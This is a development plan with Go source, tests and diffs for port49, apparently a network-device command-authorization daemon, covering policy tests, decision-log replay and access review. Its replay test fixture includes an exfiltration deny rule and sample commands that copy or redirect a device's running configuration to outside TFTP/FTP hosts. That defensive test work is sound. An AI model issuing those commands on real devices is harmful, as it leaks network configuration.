+	results := p.RunTests(time.Now())
+	failed := 0
+	for _, r := range results {
+		who := r.Test.Subject
+		if who == "" {
+			who = r.Test.Principal
+		}
+		got := "deny"
+		if r.Permit {
+			got = "permit"
+		}
+		status := "PASS"
+		if !r.Pass {
+			status = "FAIL"
+			failed++
+		}
+		line := fmt.Sprintf("%s %s on %s: %q -> %s %s", status, who, r.Test.Device, r.Test.Command, got, r.Reason)
+		if r.Err != nil {
+			line = fmt.Sprintf("%s %s on %s: %q -> error: %v", status, who, r.Test.Device, r.Test.Command, r.Err)
+		} else if !r.Pass {
+			want := r.Test.Expect
+			if r.Test.Reason != "" {
+				want += " " + r.Test.Reason
+			}
+			line += ", want " + want
+		}
+		fmt.Fprintln(stdout, line)
+		for _, c := range r.Caveats {
+			fmt.Fprintf(stdout, "     note: %s\n", c)
+		}
+	}
+	fmt.Fprintf(stdout, "%d tests, %d failed\n", len(results), failed)
+	if failed > 0 {
+		return 1
+	}
+	return 0
+}
```

<!-- patch: cmd/port49/main.go -->
```diff
diff --git a/cmd/port49/main.go b/cmd/port49/main.go
index 4efee61..51946a1 100644
--- a/cmd/port49/main.go
+++ b/cmd/port49/main.go
@@ -34,6 +34,7 @@ const usage = `usage:
   port49 token [--enable] [--ttl DURATION] [--json] [--socket PATH] DEVICE
   port49 explain --policy FILE --inventory FILE (--subject NAME | --principal ID) --device NAME
                  [--command "LINE"] [--show-attributes]
+  port49 policy test --policy FILE --inventory FILE
 `
 
 func main() { os.Exit(run(os.Args[1:], os.Stdout, os.Stderr)) }
@@ -53,6 +54,8 @@ func run(args []string, stdout, stderr io.Writer) int {
 		return agentMain(args[1:], stderr)
 	case "explain":
 		return explainCmd(args[1:], stdout, stderr)
+	case "policy":
+		return policyCmd(args[1:], stdout, stderr)
 	}
 	fmt.Fprint(stderr, usage)
 	return 2
```

- [ ] **Step 4: Run the package**

Run: `go test ./cmd/port49/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add cmd/port49/
git commit -m "feat: port49 policy test

The CI gate: loads the policy against the inventory (every load-time
check a failure), prints what CI must report, runs the file's tests
with the evaluator the daemon runs, and exits 1 on any failure.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 17: `port49 policy replay`

**Files:**
- Create: `internal/replay/replay.go`
- Modify: `cmd/port49/policy.go`, `cmd/port49/main.go`
- Test: `internal/replay/replay_test.go`; modify `cmd/port49/policy_test.go`

**Interfaces:**
- Consumes: `engine.Decode`, `Compile`, `Program.Command`, `Outcome.Policy`, `ErrHashMismatch`
  (Tasks 5, 6); `decision.Record.UnmarshalJSON`; the test drives `author.New` with `author.Engine`
  (Task 12).
- Produces: `type Status string` with `Agree`, `Diverge`, `Unverifiable`;
  `type Result struct { Line int; Event string; Status Status; Detail string }`;
  `func Replay(r io.Reader, only int) ([]Result, error)`; `func policyReplay(args []string, stdout, stderr io.Writer) int`.

Spec §5.7's three uses in one command, `port49 policy replay [--line N] LOGFILE|-`: it reads the
log alone — every blob a record names is in the same stream as a `blob` event (decision 19) — and
re-evaluates every authorization record that consulted a blob, comparing the verdict, the reason
and the matched rules. A blob event whose body does not hash to its name is a divergence (the log
was altered); a record whose blob the log never carried is unverifiable. A record denied for an
operational reason (`store_unavailable`, `blob_unavailable`) was decided before policy ran, and is
not replayed. It exits 1 on any divergence or unverifiable record.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/replay/replay_test.go -->
```go
package replay

import (
	"bytes"
	"context"
	"strings"
	"testing"
	"time"

	"github.com/prometheus/client_golang/prometheus"

	"github.com/rhwendt/port49/internal/daemon/authen"
	"github.com/rhwendt/port49/internal/daemon/author"
	"github.com/rhwendt/port49/internal/daemon/metrics"
	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
	"github.com/rhwendt/port49/internal/platform"
	"github.com/rhwendt/port49/internal/store"
	"github.com/rhwendt/port49/internal/store/memory"
	"github.com/rhwendt/port49/internal/tacacs/wire"
)

// daemonLog runs real authorizations through the daemon's handler and the
// engine, and returns the log they wrote with the blob event the broker would
// have written first: the corpus spec §14's replay assertions run over.
func daemonLog(t *testing.T) (string, string) {
	t.Helper()
	b := engine.Blob{Bundle: "sha256:policy", Platform: "arista_eos",
		Normalize: engine.Normalize{PipeToken: "|", StripCR: true}, Privilege: "admin",
		Attributes: []string{"priv-lvl=15"},
		Rules: []engine.Rule{
			{Verdict: engine.Permit, Rule: "copy **", Role: "net_operator"},
			{Verdict: engine.Permit, Rule: "show **", Role: "read_only"},
			{Verdict: engine.Deny, Rule: "* * /^tftp:/", Role: "no_exfil"},
		},
		Pipe: []string{"include **"}}
	body, hash, err := engine.Encode(b)
	if err != nil {
		t.Fatal(err)
	}
	var log bytes.Buffer
	sink := decision.NewJSONLines(&log)
	sink.Emit(decision.Record{TS: time.Now(), Event: decision.EventBlob, Blob: &decision.Blob{Hash: hash, Body: body}})
	st := memory.New(time.Now)
	st.PutBlob(context.Background(), hash, body, time.Hour)
	st.PutContext(context.Background(), store.ContextKey{NAS: "leaf-01", Username: "alice"},
		store.Context{CtxID: "ctx1", Username: "alice", Principal: "user:alice@example.com", PrivLvl: 15,
			BlobHash: hash}, time.Hour)
	m := metrics.New(prometheus.NewRegistry())
	h := author.New(st, &author.Engine{Store: st, Metrics: m}, sink, m, time.Now, platform.Defaults(),
		time.Hour, time.Minute, time.Hour)
	peer := authen.Peer{NAS: "leaf-01", NASAddr: "10.20.0.7", Platform: "arista_eos"}
	for _, line := range []string{
		"",                                      // session: context_matched
		"show version",                          // permit_dominates
		"copy running-config tftp://10.9.9.9/x", // no_permit_dominates_deny
		"configure terminal",                    // no_rule_matched
		"show run | redirect ftp://x",           // pipe_stage_denied
	} {
		r := wire.AuthorRequest{PrivLvl: 15, User: []byte("alice"), Port: []byte("vty0"),
			Args: [][]byte{[]byte("service=shell"), []byte("cmd=")}}
		if f := strings.Fields(line); len(f) > 0 {
			r.Args = [][]byte{[]byte("service=shell"), []byte("cmd=" + f[0])}
			for _, a := range f[1:] {
				r.Args = append(r.Args, []byte("cmd-arg="+a))
			}
			r.Args = append(r.Args, []byte("cmd-arg=<cr>"))
		}
		h.Handle(context.Background(), peer, r)
	}
	// A record decided before any policy ran is in the log and not replayed.
	h.Handle(context.Background(), peer, wire.AuthorRequest{User: []byte("carol"),
		Args: [][]byte{[]byte("service=shell"), []byte("cmd=show")}})
	return log.String(), hash
}

func replayAll(t *testing.T, log string) []Result {
	t.Helper()
	res, err := Replay(strings.NewReader(log), 0)
	if err != nil {
		t.Fatal(err)
	}
	return res
}

// Every record in the corpus replays against its named blob and reproduces
// the logged verdict, reason and matched rules (spec §14, "Replay agreement").
func TestEveryRecordReplaysToTheSameDecision(t *testing.T) {
	log, _ := daemonLog(t)
	res := replayAll(t, log)
	if len(res) != 5 {
		t.Fatalf("five decisions consulted the blob, replayed %d: %+v", len(res), res)
	}
	for _, r := range res {
		if r.Status != Agree {
			t.Errorf("line %d (%s): %s %s", r.Line, r.Event, r.Status, r.Detail)
		}
	}
	one, err := Replay(strings.NewReader(log), res[2].Line)
	if err != nil || len(one) != 1 || one[0].Line != res[2].Line {
		t.Fatalf("one line: %+v %v", one, err)
	}
}

// A record whose verdict was edited, whose matched rule was edited, or whose
// blob was substituted is reported as divergent rather than silently
// accepted; a record whose blob the log never carried cannot be verified
// (spec §14, "Replay divergence is detected").
func TestTamperingIsDetected(t *testing.T) {
	log, hash := daemonLog(t)
	lines := strings.Split(strings.TrimSpace(log), "\n")
	edit := func(i int, old, new string) string {
		out := append([]string(nil), lines...)
		if !strings.Contains(out[i], old) {
			t.Fatalf("line %d has no %q: %s", i, old, out[i])
		}
		out[i] = strings.Replace(out[i], old, new, 1)
		return strings.Join(out, "\n")
	}
	for name, tt := range map[string]struct {
		log    string
		status Status
		detail string
	}{
		"an edited verdict": {edit(3, `"verdict":"deny","reason":"no_permit_dominates_deny"`,
			`"verdict":"permit","reason":"permit_dominates"`), Diverge, "logged permit permit_dominates, replayed deny"},
		"an edited rule":     {edit(3, `"role":"no_exfil"`, `"role":"read_only"`), Diverge, "matched rules do not"},
		"a substituted blob": {edit(0, `"role":"no_exfil"`, `"role":"nobody"`), Diverge, "does not hash to its name"},
		"a missing blob":     {strings.Join(lines[1:], "\n"), Unverifiable, "no blob event for " + hash},
		"another bundle":     {edit(2, `"bundle":"sha256:policy"`, `"bundle":"sha256:other"`), Diverge, "names bundle"},
	} {
		var hit bool
		for _, r := range replayAll(t, tt.log) {
			if r.Status == tt.status && strings.Contains(r.Detail, tt.detail) {
				hit = true
			}
		}
		if !hit {
			t.Errorf("%s: no %s result mentioning %q in %+v", name, tt.status, tt.detail, replayAll(t, tt.log))
		}
	}
}

// A decision log is JSON lines and nothing else.
func TestALineThatIsNotARecordIsAnError(t *testing.T) {
	if _, err := Replay(strings.NewReader("{\"ts\":\"2026-09-23T00:00:00.000Z\",\"event\":\"mint\"}\nnot json\n"), 0); err == nil ||
		!strings.Contains(err.Error(), "line 2") {
		t.Fatalf("%v", err)
	}
}
```

<!-- patch: cmd/port49/policy_test.go -->
```diff
diff --git a/cmd/port49/policy_test.go b/cmd/port49/policy_test.go
index fbb1a67..341d802 100644
--- a/cmd/port49/policy_test.go
+++ b/cmd/port49/policy_test.go
@@ -6,6 +6,9 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+
+	"github.com/rhwendt/port49/internal/decision"
+	"github.com/rhwendt/port49/internal/engine"
 )
 
 // policyFixture writes a small policy and inventory and returns their paths.
@@ -110,3 +113,50 @@ func TestPolicyTestFailsAPolicyThatDoesNotLoad(t *testing.T) {
 		t.Fatalf("code %d\nstdout %s\nstderr %s", code, out.String(), errb.String())
 	}
 }
+
+// `port49 policy replay` agrees with a log the engine wrote and fails one
+// whose record was edited. The log here is written by the engine directly;
+// internal/replay's tests run the daemon's handler.
+func TestPolicyReplayFindsAnEditedRecord(t *testing.T) {
+	b := engine.Blob{Bundle: "sha256:p", Platform: "arista_eos", Normalize: engine.Normalize{PipeToken: "|"},
+		Rules: []engine.Rule{{Verdict: engine.Permit, Rule: "show **", Role: "read_only"}}}
+	body, hash, err := engine.Encode(b)
+	if err != nil {
+		t.Fatal(err)
+	}
+	decoded, err := engine.Decode(hash, body)
+	if err != nil {
+		t.Fatal(err)
+	}
+	prog, err := engine.Compile(decoded)
+	if err != nil {
+		t.Fatal(err)
+	}
+	raw := []string{"service=shell", "cmd=show", "cmd-arg=version"}
+	o := prog.Command(raw)
+	var log bytes.Buffer
+	sink := decision.NewJSONLines(&log)
+	sink.Emit(decision.Record{Event: decision.EventBlob, Blob: &decision.Blob{Hash: hash, Body: body}})
+	sink.Emit(decision.Record{Event: decision.EventAuthorizeCommand, Verdict: decision.VerdictPermit, Reason: o.Reason,
+		Device: &decision.Device{Name: "leaf-01", Platform: "arista_eos"}, Request: &decision.Request{Raw: raw},
+		Policy: o.Policy(b.Bundle, hash)})
+	path := filepath.Join(t.TempDir(), "decisions.jsonl")
+	if err := os.WriteFile(path, log.Bytes(), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	var out, errb bytes.Buffer
+	if code := run([]string{"policy", "replay", path}, &out, &errb); code != 0 ||
+		!strings.Contains(out.String(), "replayed 1 records: 1 agree, 0 diverge, 0 unverifiable") {
+		t.Fatalf("code %d\n%s%s", code, out.String(), errb.String())
+	}
+	edited := strings.Replace(log.String(), `"verdict":"permit","reason":"permit_dominates"`,
+		`"verdict":"deny","reason":"no_rule_matched"`, 1)
+	if err := os.WriteFile(path, []byte(edited), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	out.Reset()
+	if code := run([]string{"policy", "replay", "--line", "2", path}, &out, &errb); code != 1 ||
+		!strings.Contains(out.String(), "line 2 authorize_command: diverge logged deny no_rule_matched, replayed permit permit_dominates") {
+		t.Fatalf("code %d\n%s", code, out.String())
+	}
+}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/replay/ ./cmd/port49/ -count=1`
Expected: FAIL to build — `undefined: Result`, `undefined: Replay`; `cmd/port49`'s replay test
gets the usage, `code 2`.

- [ ] **Step 3: Write replay and the command**

<!-- write: internal/replay/replay.go -->
```go
// Package replay re-evaluates decision records against the blobs they name
// (spec §5.7, "Replay"; §12, `port49 policy replay`). It reads the log alone —
// the blob a record names is in the same stream as a `blob` event (spec
// §13, decision 19) — and runs internal/engine, the evaluator the daemon
// runs, so a divergence is real: an intended fix, a regression, or a log or
// blob store that was altered.
package replay

import (
	"bufio"
	"encoding/json"
	"errors"
	"fmt"
	"io"

	"github.com/rhwendt/port49/internal/decision"
	"github.com/rhwendt/port49/internal/engine"
)

// Status is what one record's replay found.
type Status string

const (
	// Agree: the blob reproduces the logged verdict, reason and matched rules.
	Agree Status = "agree"
	// Diverge: it does not, or the blob in the log is not the one its hash
	// names.
	Diverge Status = "diverge"
	// Unverifiable: the log does not carry the blob the record names.
	Unverifiable Status = "unverifiable"
)

// Result is one replayed record, by its 1-based line in the log.
type Result struct {
	Line   int
	Event  string
	Status Status
	Detail string
}

// replayable are the reasons a blob decides. A denial for an operational
// reason — the store or the blob was unavailable — was decided before any
// policy ran, and has nothing to reproduce.
var replayable = map[decision.Reason]bool{
	decision.PermitDominates: true, decision.NoRuleMatched: true, decision.NoPermitDominatesDeny: true,
	decision.PipeStageDenied: true, decision.ContextMatched: true, decision.BlobPlatformMismatch: true,
}

// Replay reads a decision log and replays every authorization record that
// consulted a blob. only, when non-zero, restricts it to the record on that
// line. A line that is not a record is an error: a decision log is JSON lines
// and nothing else.
func Replay(r io.Reader, only int) ([]Result, error) {
	var records []numbered
	blobs := map[string][]byte{}
	sc := bufio.NewScanner(r)
	sc.Buffer(make([]byte, 0, 64*1024), 16<<20)
	for n := 1; sc.Scan(); n++ {
		if len(sc.Bytes()) == 0 {
			continue
		}
		var rec decision.Record
		if err := rec.UnmarshalJSON(sc.Bytes()); err != nil {
			return nil, fmt.Errorf("line %d is not a decision record: %w", n, err)
		}
		switch {
		case rec.Event == decision.EventBlob && rec.Blob != nil:
			blobs[rec.Blob.Hash] = append([]byte(nil), rec.Blob.Body...)
		case rec.Event == decision.EventAuthorizeCommand || rec.Event == decision.EventAuthorizeSession:
			if rec.Policy != nil && rec.Policy.Blob != "" && replayable[rec.Reason] && (only == 0 || only == n) {
				records = append(records, numbered{n, rec})
			}
		}
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}
	out := make([]Result, 0, len(records))
	for _, nr := range records {
		status, detail := one(nr.rec, blobs)
		out = append(out, Result{Line: nr.line, Event: nr.rec.Event, Status: status, Detail: detail})
	}
	return out, nil
}

type numbered struct {
	line int
	rec  decision.Record
}

// one replays a single record.
func one(rec decision.Record, blobs map[string][]byte) (Status, string) {
	hash := rec.Policy.Blob
	body, ok := blobs[hash]
	if !ok {
		return Unverifiable, "the log carries no blob event for " + hash
	}
	b, err := engine.Decode(hash, body)
	if errors.Is(err, engine.ErrHashMismatch) {
		return Diverge, "the blob event for " + hash + " does not hash to its name: the log was altered"
	}
	if err != nil {
		return Diverge, "the blob event for " + hash + " does not decode: " + err.Error()
	}
	if rec.Policy.Bundle != b.Bundle {
		return Diverge, fmt.Sprintf("the record names bundle %s; its blob was compiled from %s", rec.Policy.Bundle, b.Bundle)
	}
	prog, err := engine.Compile(b)
	if err != nil {
		return Diverge, "the blob does not compile: " + err.Error()
	}
	verdict, reason := decision.VerdictPermit, decision.ContextMatched
	var pol *decision.Policy
	switch {
	case rec.Device != nil && rec.Device.Platform != b.Platform:
		verdict, reason = decision.VerdictDeny, decision.BlobPlatformMismatch
	case rec.Event == decision.EventAuthorizeCommand:
		if rec.Request == nil {
			return Diverge, "the record has no request to replay"
		}
		o := prog.Command(rec.Request.Raw)
		reason = o.Reason
		if !o.Permit {
			verdict = decision.VerdictDeny
		}
		pol = o.Policy(b.Bundle, hash)
	}
	if verdict != rec.Verdict || reason != rec.Reason {
		return Diverge, fmt.Sprintf("logged %s %s, replayed %s %s", rec.Verdict, rec.Reason, verdict, reason)
	}
	if pol != nil {
		logged, _ := json.Marshal(rec.Policy)
		replayed, _ := json.Marshal(pol)
		if string(logged) != string(replayed) {
			return Diverge, fmt.Sprintf("the verdict agrees but the matched rules do not: logged %s, replayed %s",
				logged, replayed)
		}
	}
	return Agree, ""
}
```

<!-- patch: cmd/port49/policy.go -->
```diff
diff --git a/cmd/port49/policy.go b/cmd/port49/policy.go
index 4d09eb4..11d96fd 100644
--- a/cmd/port49/policy.go
+++ b/cmd/port49/policy.go
@@ -4,10 +4,12 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"os"
 	"time"
 
 	"github.com/rhwendt/port49/internal/admission"
 	"github.com/rhwendt/port49/internal/policy"
+	"github.com/rhwendt/port49/internal/replay"
 )
 
 // policyFiles are the two files every policy tool reads: the policy and the
@@ -74,6 +76,8 @@ func policyCmd(args []string, stdout, stderr io.Writer) int {
 	switch args[0] {
 	case "test":
 		return policyTest(args[1:], stdout, stderr)
+	case "replay":
+		return policyReplay(args[1:], stdout, stderr)
 	}
 	fmt.Fprint(stderr, usage)
 	return 2
@@ -136,3 +140,53 @@ func policyTest(args []string, stdout, stderr io.Writer) int {
 	}
 	return 0
 }
+
+// policyReplay re-evaluates a decision log against the blobs it carries
+// (spec §5.7, "Replay"): an auditor's reconstruction, a regression check of a
+// captured corpus against this build, and an integrity check of the log. It
+// prints every record that did not agree and exits 1 if any did not; with
+// --line it replays that one record and prints it either way.
+func policyReplay(args []string, stdout, stderr io.Writer) int {
+	fs := flag.NewFlagSet("port49 policy replay", flag.ContinueOnError)
+	fs.SetOutput(stderr)
+	only := fs.Int("line", 0, "replay only the record on this line of the log")
+	if err := fs.Parse(args); err != nil {
+		return 2
+	}
+	if fs.NArg() != 1 {
+		fmt.Fprint(stderr, usage)
+		return 2
+	}
+	in := io.Reader(os.Stdin)
+	if name := fs.Arg(0); name != "-" {
+		f, err := os.Open(name)
+		if err != nil {
+			fmt.Fprintln(stderr, "port49 policy replay:", err)
+			return 1
+		}
+		defer f.Close()
+		in = f
+	}
+	results, err := replay.Replay(in, *only)
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 policy replay:", err)
+		return 1
+	}
+	counts := map[replay.Status]int{}
+	for _, r := range results {
+		counts[r.Status]++
+		if r.Status != replay.Agree || *only != 0 {
+			fmt.Fprintf(stdout, "line %d %s: %s %s\n", r.Line, r.Event, r.Status, r.Detail)
+		}
+	}
+	fmt.Fprintf(stdout, "replayed %d records: %d agree, %d diverge, %d unverifiable\n", len(results),
+		counts[replay.Agree], counts[replay.Diverge], counts[replay.Unverifiable])
+	if *only != 0 && len(results) == 0 {
+		fmt.Fprintf(stderr, "port49 policy replay: line %d is not an authorization record that consulted a blob\n", *only)
+		return 1
+	}
+	if counts[replay.Diverge]+counts[replay.Unverifiable] > 0 {
+		return 1
+	}
+	return 0
+}
```

<!-- patch: cmd/port49/main.go -->
```diff
diff --git a/cmd/port49/main.go b/cmd/port49/main.go
index 51946a1..1df839d 100644
--- a/cmd/port49/main.go
+++ b/cmd/port49/main.go
@@ -35,6 +35,7 @@ const usage = `usage:
   port49 explain --policy FILE --inventory FILE (--subject NAME | --principal ID) --device NAME
                  [--command "LINE"] [--show-attributes]
   port49 policy test --policy FILE --inventory FILE
+  port49 policy replay [--line N] LOGFILE|-
 `
 
 func main() { os.Exit(run(os.Args[1:], os.Stdout, os.Stderr)) }
```

- [ ] **Step 4: Run the packages**

Run: `go test ./internal/replay/ ./cmd/port49/ -count=1 && go vet ./internal/replay/ ./cmd/...`
Expected: PASS: five of the daemon's own records replay in agreement, and each of the five
tamperings is reported.

- [ ] **Step 5: Commit**

```bash
git add internal/replay/ cmd/port49/
git commit -m "feat: port49 policy replay

Re-evaluates every authorization record in a decision log against the
blob event the log carries for it, with the evaluator the daemon runs,
and reports agreement, divergence (verdict, reason or matched rules; a
blob that does not hash to its name) or a record whose blob the log
never carried (spec §5.7).

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 18: `port49 access review`

**Files:**
- Create: `internal/policy/review.go`
- Modify: `cmd/port49/policy.go`, `cmd/port49/main.go`
- Test: `internal/policy/review_test.go`; modify `cmd/port49/policy_test.go`

**Interfaces:**
- Consumes: `Policy.Grants`, `Scope.selects` (Tasks 8, 9).
- Produces: `type ReviewRow struct { Scope string; Roles []string; MaxPrivilege string; Expires time.Time; Expired bool; Devices int }`;
  `func (*Policy) Review(subject string, now time.Time) ([]ReviewRow, error)`;
  `func accessReview(args []string, stdout, stderr io.Writer) int`.

`port49 access review --policy FILE --inventory FILE --subject NAME` renders the flat grant table
for one subject (spec §12; decision 2): every row it appears in, its scope's size against the
inventory, its ceiling and its expiry, marked when passed.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/review_test.go -->
```go
package policy

import (
	"strings"
	"testing"
	"time"
)

// Access review renders the flat grant table for one subject, with scope size
// and expiry (spec §12).
func TestReviewListsEveryGrantRow(t *testing.T) {
	p := spec11(t, spec11Raw(t))
	rows, err := p.Review("noc_tier1", noon)
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 || rows[0].Scope != "all_devices" || rows[0].Devices != 5 || rows[0].Expired ||
		rows[1].Scope != "dc_fabric" || rows[1].Devices != 1 || strings.Join(rows[1].Roles, ",") != "interface_tech" ||
		rows[1].Expires.Format("2006-01-02") != "2026-12-01" {
		t.Fatalf("rows: %+v", rows)
	}
	later, _ := p.Review("noc_tier1", time.Date(2026, 12, 2, 0, 0, 0, 0, time.UTC))
	if !later[1].Expired || later[0].Expired {
		t.Fatalf("expiry: %+v", later)
	}
	// srx_unpatched holds srx-fw-04, and srx-fw-22 because its version could
	// not be compared; srx-fw-05 is patched.
	if rows, _ := p.Review("security_ir", noon); len(rows) != 1 || rows[0].Devices != 2 {
		t.Fatalf("%+v", rows)
	}
	if _, err := p.Review("nobody", noon); err == nil {
		t.Fatal("an undeclared subject is an error")
	}
}
```

<!-- patch: cmd/port49/policy_test.go -->
```diff
diff --git a/cmd/port49/policy_test.go b/cmd/port49/policy_test.go
index 341d802..7cb394d 100644
--- a/cmd/port49/policy_test.go
+++ b/cmd/port49/policy_test.go
@@ -160,3 +160,22 @@ func TestPolicyReplayFindsAnEditedRecord(t *testing.T) {
 		t.Fatalf("code %d\n%s", code, out.String())
 	}
 }
+
+// `port49 access review` prints every grant row of one subject with the scope
+// size, from the files alone.
+func TestAccessReviewPrintsTheGrantRows(t *testing.T) {
+	pol, inv := policyFixture(t)
+	var out, errb bytes.Buffer
+	if code := run([]string{"access", "review", "--policy", pol, "--inventory", inv, "--subject", "noc"}, &out, &errb); code != 0 {
+		t.Fatalf("code %d %s", code, errb.String())
+	}
+	for _, want := range []string{"noc (humans; identity user:noc@example.com)", "SCOPE", "all_devices  read_only no_reload  -",
+		"never", "1"} {
+		if !strings.Contains(out.String(), want) {
+			t.Errorf("output lacks %q:\n%s", want, out.String())
+		}
+	}
+	if code := run([]string{"access", "review", "--policy", pol, "--inventory", inv, "--subject", "nobody"}, &out, &errb); code != 1 {
+		t.Fatalf("an undeclared subject: code %d", code)
+	}
+}
```

- [ ] **Step 2: Run them to see them fail**

Run: `go test ./internal/policy/ ./cmd/port49/ -count=1`
Expected: FAIL to build — `p.Review undefined`.

- [ ] **Step 3: Write the review and the command**

<!-- write: internal/policy/review.go -->
```go
package policy

import (
	"fmt"
	"time"
)

// ReviewRow is one grant row a subject appears in, as access review renders
// it (spec §12): the flat grant table is the report, not an investigation.
type ReviewRow struct {
	Scope        string
	Roles        []string
	MaxPrivilege string
	Expires      time.Time // zero: never
	Expired      bool
	// Devices is how many devices in the inventory the scope selects now.
	Devices int
}

// Review lists every grant row naming subject, in file order, with its
// scope's size against the inventory and whether it has expired at now.
func (p *Policy) Review(subject string, now time.Time) ([]ReviewRow, error) {
	if _, ok := p.subs[subject]; !ok {
		return nil, fmt.Errorf("subject %q is not declared", subject)
	}
	var out []ReviewRow
	for _, g := range p.Grants(subject) {
		row := ReviewRow{Scope: g.Scope, Roles: g.Roles, MaxPrivilege: g.MaxPrivilege, Expires: g.Expires,
			Expired: !g.Expires.IsZero() && !now.Before(g.Expires)}
		for _, d := range p.env.Devices {
			if ok, _ := p.scopes[g.Scope].selects(d); ok {
				row.Devices++
			}
		}
		out = append(out, row)
	}
	return out, nil
}
```

<!-- patch: cmd/port49/policy.go -->
```diff
diff --git a/cmd/port49/policy.go b/cmd/port49/policy.go
index 11d96fd..7042cd9 100644
--- a/cmd/port49/policy.go
+++ b/cmd/port49/policy.go
@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"strings"
+	"text/tabwriter"
 	"time"
 
 	"github.com/rhwendt/port49/internal/admission"
@@ -190,3 +192,60 @@ func policyReplay(args []string, stdout, stderr io.Writer) int {
 	}
 	return 0
 }
+
+// accessReview renders the flat grant table for one subject (spec §12): every
+// row it appears in, with the scope's size against the inventory and the
+// row's expiry. It is the report an access review signs, and `port49 grants
+// remove` is what acts on it.
+func accessReview(args []string, stdout, stderr io.Writer) int {
+	fs := flag.NewFlagSet("port49 access review", flag.ContinueOnError)
+	fs.SetOutput(stderr)
+	var files policyFiles
+	files.register(fs)
+	subject := fs.String("subject", "", "the subject, by its name in the policy")
+	if err := fs.Parse(args); err != nil {
+		return 2
+	}
+	if *subject == "" || fs.NArg() != 0 {
+		fmt.Fprint(stderr, usage)
+		return 2
+	}
+	p, err := files.load()
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 access review:", err)
+		return 1
+	}
+	now := time.Now()
+	rows, err := p.Review(*subject, now)
+	if err != nil {
+		fmt.Fprintln(stderr, "port49 access review:", err)
+		return 1
+	}
+	s, _ := p.Subject(*subject)
+	who := "group " + s.Group
+	if s.Group == "" {
+		who = "identity " + strings.Join(s.Identity, ", ")
+	}
+	fmt.Fprintf(stdout, "%s (%s; %s)\n", *subject, s.Domain, who)
+	if len(rows) == 0 {
+		fmt.Fprintln(stdout, "no grant rows: the subject matches nothing; `port49 grants remove` deletes the block")
+		return 0
+	}
+	tw := tabwriter.NewWriter(stdout, 0, 0, 2, ' ', 0)
+	fmt.Fprintln(tw, "SCOPE\tROLES\tMAX_PRIVILEGE\tEXPIRES\tDEVICES")
+	for _, r := range rows {
+		ceiling, expires := r.MaxPrivilege, "never"
+		if ceiling == "" {
+			ceiling = "-"
+		}
+		if !r.Expires.IsZero() {
+			expires = r.Expires.UTC().Format(time.RFC3339)
+			if r.Expired {
+				expires += " (expired)"
+			}
+		}
+		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%d\n", r.Scope, strings.Join(r.Roles, " "), ceiling, expires, r.Devices)
+	}
+	tw.Flush()
+	return 0
+}
```

<!-- patch: cmd/port49/main.go -->
```diff
diff --git a/cmd/port49/main.go b/cmd/port49/main.go
index 1df839d..6c91b5f 100644
--- a/cmd/port49/main.go
+++ b/cmd/port49/main.go
@@ -36,6 +36,7 @@ const usage = `usage:
                  [--command "LINE"] [--show-attributes]
   port49 policy test --policy FILE --inventory FILE
   port49 policy replay [--line N] LOGFILE|-
+  port49 access review --policy FILE --inventory FILE --subject NAME
 `
 
 func main() { os.Exit(run(os.Args[1:], os.Stdout, os.Stderr)) }
@@ -57,6 +58,10 @@ func run(args []string, stdout, stderr io.Writer) int {
 		return explainCmd(args[1:], stdout, stderr)
 	case "policy":
 		return policyCmd(args[1:], stdout, stderr)
+	case "access":
+		if len(args) > 1 && args[1] == "review" {
+			return accessReview(args[2:], stdout, stderr)
+		}
 	}
 	fmt.Fprint(stderr, usage)
 	return 2
```

- [ ] **Step 4: Run the packages**

Run: `go test ./internal/policy/ ./cmd/port49/ -count=1`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/policy/review.go internal/policy/review_test.go cmd/port49/
git commit -m "feat: port49 access review

Every grant row a subject appears in, with its scope's size against
the inventory, its ceiling and its expiry (spec §12).

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc"
```

---

### Task 19: `port49 grants remove --subject`

**Files:**
- Create: `internal/policy/edit.go`
- Modify: `cmd/port49/policy.go`, `cmd/port49/main.go`
- Test: `internal/policy/edit_test.go`; modify `cmd/port49/policy_test.go`

**Interfaces:**
- Consumes: `Parse` (Task 8); `yaml.Node`.
- Produces: `type Removal struct { Grants, Tests int }`;
  `func RemoveSubject(raw []byte, subject string) ([]byte, Removal, error)`;
  `func grantsRemove(args []string, stdout, stderr io.Writer) int`; `func replaceFile(path string, data []byte) error`.

`port49 grants remove --policy FILE --inventory FILE --subject NAME [--write]` is the offboarding
path for machine subjects and literal identities (spec §12; decision 2's accepted cost): every grant
row naming the subject, then the subject block, so nothing is left behind to match, and the tests
naming it, which would otherwise make the file refuse to load (Decided 19). The result must load
against the inventory before anything is printed or written; `--write` replaces the file through a
rename, keeping its mode.

- [ ] **Step 1: Write the failing tests**

<!-- write: internal/policy/edit_test.go -->
```go
package policy

import (
	"strings"
	"testing"
)

// Offboarding a machine subject is one command (spec §12; decision 2's cost):
// every grant row goes, then the subject block, and the result still loads
// and still passes the tests that did not name it.
func TestRemoveSubjectDeletesItsRowsAndItsBlock(t *testing.T) {
	out, r, err := RemoveSubject(spec11Raw(t), "svc_oxidized")
	if err != nil {
		t.Fatal(err)
	}
	if r.Grants != 1 || r.Tests != 2 {
		t.Fatalf("removed %+v, want one grant row and two tests", r)
	}
